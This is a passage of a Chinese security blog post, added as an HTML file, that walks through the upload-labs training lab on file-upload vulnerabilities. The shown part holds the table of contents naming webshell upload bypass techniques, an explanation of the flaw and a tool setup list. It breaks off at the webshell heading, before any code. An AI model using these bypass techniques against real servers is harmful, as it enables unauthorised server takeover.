@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"byroins.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.28.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"github","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":2,"unescape":true,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Environment: PHP Apache   Lab: upload-labs   1.0 文件上传基础01 文件上传漏洞是什么? 文件上传漏洞是指攻击者上传了一个可执行的文件到服务器并成功执行,  从而获取服务器权限的漏洞. 其本质是服务端未对上传文件进行充分校验,  导致恶意文件(如 WebShell)被当作合法文件存储并解析执行. 02 攻击链  03 项目搭建    项目 说明">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Upload-File">
+<meta property="og:url" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/index.html">
+<meta property="og:site_name" content="Byron">
+<meta property="og:description" content="Environment: PHP Apache   Lab: upload-labs   1.0 文件上传基础01 文件上传漏洞是什么? 文件上传漏洞是指攻击者上传了一个可执行的文件到服务器并成功执行,  从而获取服务器权限的漏洞. 其本质是服务端未对上传文件进行充分校验,  导致恶意文件(如 WebShell)被当作合法文件存储并解析执行. 02 攻击链  03 项目搭建    项目 说明">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/1.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/2.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/3.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/4.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/5.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/6.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/7.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/8.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/9.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/10.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/11.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/12.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/13.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/14.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/15.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/16.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/19.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/20.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/17.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/18.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/21.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/22.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/23.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/24.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/25.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/26.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/27.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/28.png">
+<meta property="article:published_time" content="2026-07-31T14:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-03T08:35:42.406Z">
+<meta property="article:author" content="Byron">
+<meta property="article:tag" content=".htaccess">
+<meta property="article:tag" content=".user.ini">
+<meta property="article:tag" content="JS校验绕过">
+<meta property="article:tag" content="MIME类型校验绕过">
+<meta property="article:tag" content="upload-file">
+<meta property="article:tag" content="upload-labs">
+<meta property="article:tag" content="文件头伪造(图片马)">
+<meta property="article:tag" content="条件竞争">
+<meta property="article:tag" content="黑名单绕过">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/1.png">
+
+
+<link rel="canonical" href="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/","path":"2026/07/31/web-security/upload-file/2026-07-31-upload-file/","title":"Upload-File"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Upload-File | Byron</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Byron" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Byron</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Web Application Security Research & Exploit Development</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">1.0 文件上传基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-0-upload-labs%E5%AE%9E%E6%88%98"><span class="nav-number">2.</span> <span class="nav-text">2.0 upload-labs实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E5%89%8D%E7%AB%AFJS%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87-Pass-01"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 前端JS校验绕过(Pass-01)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01-%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.1.</span> <span class="nav-text">01 原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-number">2.1.2.</span> <span class="nav-text">02 绕过方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#03-%E8%8E%B7%E5%8F%96shell-%E7%A4%BA%E4%BE%8B%E5%B7%A5%E5%85%B7%E4%B8%BA%E8%9A%81%E5%89%91"><span class="nav-number">2.1.3.</span> <span class="nav-text">03 获取shell(示例工具为蚁剑)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-MIME%E7%B1%BB%E5%9E%8B%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87-Pass-02"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 MIME类型校验绕过(Pass-02)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01-%E5%8E%9F%E7%90%86-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">01 原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">02 绕过方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-1-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-%E9%9D%9E%E5%B8%B8%E8%A7%84%E5%90%8E%E7%BC%80-%E7%AD%89%E4%BB%B7%E6%89%A9%E5%B1%95%E5%90%8D-Pass-03"><span class="nav-number">2.3.</span> <span class="nav-text">2.3.1 黑名单绕过 - 非常规后缀(等价扩展名)(Pass-03)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01-%E5%8E%9F%E7%90%86-2"><span class="nav-number">2.3.1.</span> <span class="nav-text">01 原理:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-2"><span class="nav-number">2.3.2.</span> <span class="nav-text">02 绕过方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-2-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87-Pass-06"><span class="nav-number">2.4.</span> <span class="nav-text">2.3.2 黑名单绕过 - 大小写绕过(Pass-06)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01-%E5%8E%9F%E7%90%86-3"><span class="nav-number">2.4.1.</span> <span class="nav-text">01 原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-3"><span class="nav-number">2.4.2.</span> <span class="nav-text">02 绕过方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-3-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-%E5%90%8E%E7%BC%80%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87-Pass-07"><span class="nav-number">2.5.</span> <span class="nav-text">2.3.3 黑名单绕过 - 后缀空格绕过(Pass-07)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01-%E5%8E%9F%E7%90%86-4"><span class="nav-number">2.5.1.</span> <span class="nav-text">01 原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-4"><span class="nav-number">2.5.2.</span> <span class="nav-text">02 绕过方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-4-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-%E5%90%8E%E7%BC%80%E7%82%B9%E7%BB%95%E8%BF%87-Pass-08"><span class="nav-number">2.6.</span> <span class="nav-text">2.3.4 黑名单绕过 - 后缀点绕过(Pass-08)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01-%E5%8E%9F%E7%90%86-5"><span class="nav-number">2.6.1.</span> <span class="nav-text">01 原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-5"><span class="nav-number">2.6.2.</span> <span class="nav-text">02 绕过方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-5-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-DATA%E7%BB%95%E8%BF%87-Pass-09"><span class="nav-number">2.7.</span> <span class="nav-text">2.3.5 黑名单绕过 - ::$DATA绕过(Pass-09)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01-%E5%8E%9F%E7%90%86-6"><span class="nav-number">2.7.1.</span> <span class="nav-text">01 原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-6"><span class="nav-number">2.7.2.</span> <span class="nav-text">02 绕过方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-6-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-%E7%82%B9%E7%A9%BA%E6%A0%BC%E7%82%B9%E7%BB%95%E8%BF%87-Pass-10"><span class="nav-number">2.8.</span> <span class="nav-text">2.3.6 黑名单绕过 - 点空格点绕过(Pass-10)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01-%E5%8E%9F%E7%90%86-7"><span class="nav-number">2.8.1.</span> <span class="nav-text">01 原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-7"><span class="nav-number">2.8.2.</span> <span class="nav-text">02 绕过方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-7-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87-Pass-11"><span class="nav-number">2.9.</span> <span class="nav-text">2.3.7 黑名单绕过 - 双写绕过(Pass-11)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01-%E5%8E%9F%E7%90%86-8"><span class="nav-number">2.9.1.</span> <span class="nav-text">01 原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-8"><span class="nav-number">2.9.2.</span> <span class="nav-text">02 绕过方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-htaccess%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87-Pass-04"><span class="nav-number">2.10.</span> <span class="nav-text">2.4 .htaccess文件绕过(Pass-04)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01-%E5%8E%9F%E7%90%86-9"><span class="nav-number">2.10.1.</span> <span class="nav-text">01 原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-9"><span class="nav-number">2.10.2.</span> <span class="nav-text">02 绕过方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-user-ini%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87-Pass-05"><span class="nav-number">2.11.</span> <span class="nav-text">2.5 .user.ini文件绕过(Pass-05)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01-%E5%8E%9F%E7%90%86-10"><span class="nav-number">2.11.1.</span> <span class="nav-text">01 原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-10"><span class="nav-number">2.11.2.</span> <span class="nav-text">02 绕过方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-1-%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87-%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87-Pass-14"><span class="nav-number">2.12.</span> <span class="nav-text">2.6.1 图片马绕过-文件头绕过(Pass-14)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01-%E5%8E%9F%E7%90%86-11"><span class="nav-number">2.12.1.</span> <span class="nav-text">01 原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-11"><span class="nav-number">2.12.2.</span> <span class="nav-text">02 绕过方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-2-%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87-getimagesize-Pass-15"><span class="nav-number">2.13.</span> <span class="nav-text">2.6.2 图片马绕过-getimagesize()(Pass-15)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01-%E5%8E%9F%E7%90%86-12"><span class="nav-number">2.13.1.</span> <span class="nav-text">01 原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-1-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-1"><span class="nav-number">2.13.2.</span> <span class="nav-text">02-1 绕过方式 1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-2-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-2"><span class="nav-number">2.13.3.</span> <span class="nav-text">02-2 绕过方式 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-3-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-3"><span class="nav-number">2.13.4.</span> <span class="nav-text">02-3 绕过方式 3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-3-%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93-Pass-17"><span class="nav-number">2.14.</span> <span class="nav-text">2.6.3 图片马绕过-二次渲染(Pass-17)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01-%E5%8E%9F%E7%90%86-13"><span class="nav-number">2.14.1.</span> <span class="nav-text">01 原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-12"><span class="nav-number">2.14.2.</span> <span class="nav-text">02 绕过方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-7-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-Pass-18"><span class="nav-number">2.15.</span> <span class="nav-text">2.7 条件竞争(Pass-18)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01-%E5%8E%9F%E7%90%86-14"><span class="nav-number">2.15.1.</span> <span class="nav-text">01 原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-13"><span class="nav-number">2.15.2.</span> <span class="nav-text">02 绕过方式</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Byron"
+      src="/images/private/icon1.png">
+  <p class="site-author-name" itemprop="name">Byron</p>
+  <div class="site-description" itemprop="description">Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/byroins/penetration-testing" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;byroins&#x2F;penetration-testing" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml" rel="noopener me"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/07/31/web-security/upload-file/2026-07-31-upload-file/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Upload-File | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Upload-File
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-07-31 22:00:00" itemprop="dateCreated datePublished" datetime="2026-07-31T22:00:00+08:00">2026-07-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-08-03 16:35:42" itemprop="dateModified" datetime="2026-08-03T16:35:42+08:00">2026-08-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/upload-file/" itemprop="url" rel="index"><span itemprop="name">upload-file</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>Environment: PHP Apache</p>
+</blockquote>
+<blockquote>
+<p>Lab: upload-labs</p>
+</blockquote>
+<hr>
+<h2 id="1-0-文件上传基础"><a href="#1-0-文件上传基础" class="headerlink" title="1.0 文件上传基础"></a>1.0 文件上传基础</h2><p><strong>01 文件上传漏洞是什么?</strong></p>
+<p>文件上传漏洞是指攻击者上传了一个可执行的文件到服务器并成功执行,  从而获取服务器权限的漏洞. 其本质是<strong>服务端未对上传文件进行充分校验</strong>,  导致恶意文件(如 WebShell)被当作合法文件存储并解析执行.</p>
+<p><strong>02 攻击链</strong></p>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/1.png"></p>
+<p><strong>03 项目搭建</strong></p>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>靶场地址</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></td>
+</tr>
+<tr>
+<td>推荐环境</td>
+<td>phpstudy（Windows）&#x2F; Docker</td>
+</tr>
+<tr>
+<td>PHP版本</td>
+<td>5.2 ~ 5.6（部分关卡需要低版本）</td>
+</tr>
+<tr>
+<td>Web服务器</td>
+<td>Apache（.htaccess相关关卡需要）</td>
+</tr>
+<tr>
+<td>工具</td>
+<td>Burp Suite, HxD(十六进制编辑器), 蚁剑&#x2F;冰蝎</td>
+</tr>
+</tbody></table>
+<p><strong>04 一句话木马</strong></p>
